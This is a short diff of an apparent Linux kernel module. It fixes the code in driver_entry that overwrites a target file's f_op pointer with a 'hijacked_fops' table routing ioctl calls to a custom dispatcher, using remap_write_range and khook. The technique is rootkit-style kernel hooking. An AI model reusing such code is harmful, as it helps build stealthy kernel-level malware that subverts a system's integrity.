@@ -198,8 +198,8 @@ int __init driver_entry(void)
 	hijacked_fops.owner = THIS_MODULE;
 	hijacked_fops.unlocked_ioctl = dispatch_ioctl;
 
-	directory_entry_ptr = &directory_entry;
-	if (remap_write_range((void *)&target_file->f_op, &directory_entry_ptr, sizeof(void *), true)) {
+	struct file_operations *hijacked_fops_ptr = &hijacked_fops;
+	if (remap_write_range((void *)&target_file->f_op, &hijacked_fops_ptr, sizeof(void *), true)) {
         printk(KERN_ERR "[-] Failed to overwrite f_op for %s\n", TARGET_FILE);
         filp_close(target_file, NULL);
         khook_exit();
